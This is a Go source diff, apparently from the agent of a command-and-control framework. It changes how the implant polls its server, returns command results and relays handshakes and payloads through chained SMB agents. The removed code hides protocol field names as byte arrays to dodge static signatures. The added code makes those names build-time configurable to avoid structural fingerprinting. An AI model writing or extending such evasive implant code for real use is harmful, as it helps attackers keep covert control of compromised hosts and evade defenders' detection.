@@ -31,24 +31,25 @@ var (
 	pollStatusNoCommands  = string([]byte{0x6e, 0x6f, 0x5f, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x73})                                                                                     // no_commands
 	pollKeyAgentID        = string([]byte{0x61, 0x67, 0x65, 0x6e, 0x74, 0x5f, 0x69, 0x64})                                                                                                       // agent_id
 	pollKeyResults        = string([]byte{0x72, 0x65, 0x73, 0x75, 0x6c, 0x74, 0x73})                                                                                                             // results
-	pollKeyLinkUnlink     = string([]byte{0x6c, 0x75})                                                                                                                                           // lu
-	pollKeyRoutingID      = string([]byte{0x72})                                                                                                                                                 // r
-	pollKeyPayload        = string([]byte{0x70})                                                                                                                                                 // p
 	pollMsgType           = string([]byte{0x74, 0x79, 0x70, 0x65})                                                                                                                               // type
 	pollMsgPayload        = string([]byte{0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64})                                                                                                             // payload
 	pollTypeHandshakeResp = string([]byte{0x68, 0x61, 0x6e, 0x64, 0x73, 0x68, 0x61, 0x6b, 0x65, 0x5f, 0x72, 0x65, 0x73, 0x70, 0x6f, 0x6e, 0x73, 0x65})                                           // handshake_response
 )
 
-// Malleable field values (constructed to avoid static signatures)
+// Malleable field values - injected at build time via ldflags
+// These can be customized in config.toml to avoid structural fingerprinting
 var (
-	MALLEABLE_REKEY_COMMAND         = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79, 0x5f, 0x72, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64})          // rekey_required
-	MALLEABLE_REKEY_STATUS_FIELD    = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                          // status
-	MALLEABLE_REKEY_DATA_FIELD      = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                      // data
-	MALLEABLE_REKEY_ID_FIELD        = string([]byte{0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x5f, 0x64, 0x62, 0x5f, 0x69, 0x64})                // command_db_id
-	MALLEABLE_LINK_DATA_FIELD       = string([]byte{0x6c, 0x64})                                                                                  // ld
-	MALLEABLE_LINK_COMMANDS_FIELD   = string([]byte{0x6c, 0x63})                                                                                  // lc
-	MALLEABLE_LINK_HANDSHAKE_FIELD  = string([]byte{0x6c, 0x68})                                                                                  // lh
-	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = string([]byte{0x6c, 0x72})                                                                              // lr
+	MALLEABLE_REKEY_COMMAND             = "rekey_required"
+	MALLEABLE_REKEY_STATUS_FIELD        = "status"
+	MALLEABLE_REKEY_DATA_FIELD          = "data"
+	MALLEABLE_REKEY_ID_FIELD            = "command_db_id"
+	MALLEABLE_LINK_DATA_FIELD           = "ld"
+	MALLEABLE_LINK_COMMANDS_FIELD       = "lc"
+	MALLEABLE_LINK_HANDSHAKE_FIELD      = "lh"
+	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = "lr"
+	MALLEABLE_LINK_UNLINK_FIELD         = "lu"
+	MALLEABLE_ROUTING_ID_FIELD          = "r"
+	MALLEABLE_PAYLOAD_FIELD             = "p"
 )
 
 // PollConfig holds the configuration for polling behavior
@@ -499,6 +500,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	// The SMB agent is waiting in performHandshake for the handshake_response.
 	// If we send a command first, the SMB agent will receive "data" when expecting
 	// "handshake_response", fail the handshake, and close the pipe.
+
 	if linkRespVal, ok := responseMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
 		if linkRespData, ok := linkRespVal.([]interface{}); ok {
 			// log.Printf("[LinkManager] Processing %d handshake responses before commands", len(linkRespData))
@@ -568,7 +570,7 @@ func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]st
 	// Build payload with only link data
 	payload := make(map[string]interface{})
 	payload[pollKeyAgentID] = clientID
-	payload[MALLEABLE_LINK_DATA_FIELD] = linkData
+	payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
 
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
@@ -621,8 +623,8 @@ func processLinkCommands(linkCmds []interface{}) {
 		}
 
 		// Extract routing ID and payload using malleable field names
-		routingID, _ := cmdMap[pollKeyRoutingID].(string)
-		payload, _ := cmdMap[pollKeyPayload].(string)
+		routingID, _ := cmdMap[MALLEABLE_ROUTING_ID_FIELD].(string)
+		payload, _ := cmdMap[MALLEABLE_PAYLOAD_FIELD].(string)
 
 		if routingID == "" || payload == "" {
 			continue
@@ -676,8 +678,8 @@ func processLinkHandshakeResponses(responses []interface{}) {
 		}
 
 		// Extract routing ID and payload
-		routingID, _ := respMap[pollKeyRoutingID].(string)
-		payload, _ := respMap[pollKeyPayload].(string)
+		routingID, _ := respMap[MALLEABLE_ROUTING_ID_FIELD].(string)
+		payload, _ := respMap[MALLEABLE_PAYLOAD_FIELD].(string)
 
 		if routingID == "" || payload == "" {
 			continue
@@ -698,9 +700,9 @@ func processLinkHandshakeResponses(responses []interface{}) {
 		// Send handshake response to SMB agent
 		// Include the lr array for forwarding to grandchildren (SMB chains)
 		message := map[string]interface{}{
-			pollMsgType:    pollTypeHandshakeResp,
-			pollMsgPayload: payload,
-			"lr":           []interface{}{respMap}, // Include for forwarding to grandchildren
+			pollMsgType:                         pollTypeHandshakeResp,
+			pollMsgPayload:                      payload,
+			MALLEABLE_LINK_HANDSHAKE_RESP_FIELD: []interface{}{respMap}, // Include for forwarding to grandchildren
 		}
 
 		data, err := json.Marshal(message)
@@ -813,14 +815,14 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 					payload[pollKeyResults] = results
 				}
 				if hasLinkData {
-					payload[MALLEABLE_LINK_DATA_FIELD] = linkData
+					payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
 				}
 				if hasLinkHandshake {
 					// Send handshake as single object via "lh" field
-					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake
+					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.ToMalleableMap()
 				}
 				if hasUnlinkNotifications {
-					payload[pollKeyLinkUnlink] = unlinkNotifications
+					payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
 				}
 
 				jsonData, err := json.Marshal(payload)
